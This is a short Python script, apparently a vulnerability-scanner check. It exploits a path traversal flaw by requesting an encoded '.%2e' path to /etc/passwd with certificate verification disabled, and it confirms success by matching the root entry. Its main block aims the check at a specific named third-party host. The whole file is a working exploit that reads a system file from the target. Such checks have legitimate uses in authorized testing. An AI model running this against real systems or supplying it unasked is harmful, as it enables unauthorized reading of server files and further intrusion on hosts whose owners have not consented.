import requests, re, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url + "//////.%2e/.%2e/.%2e/etc/passwd"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    response = requests.get(targetUrl, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and re.search("root:[x*]:0:0:", response.text):
        return targetUrl
    else:
        return False


if __name__ == '__main__':
    print(doCheck("https://monitor-web-us.dotfashion.cn/"))
